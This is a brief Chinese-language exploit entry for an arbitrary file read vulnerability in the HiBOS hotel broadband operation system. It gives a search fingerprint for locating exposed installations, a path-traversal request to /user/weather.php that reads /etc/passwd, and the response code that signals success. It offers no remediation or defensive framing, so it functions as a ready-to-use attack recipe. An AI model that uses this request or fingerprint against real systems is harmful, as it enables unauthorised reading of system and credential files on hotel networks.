# HiBOS酒店宽带运营系统weather接口存在任意文件读取漏洞

HiBOS ｜ 任意文件读取/写入 ｜ —
- **指纹**：`title="酒店宽带运营系统"`
- **请求**：`GET /user/weather.php?Lang=../../../etc/passwd HTTP/1.1`
- **响应特征**：200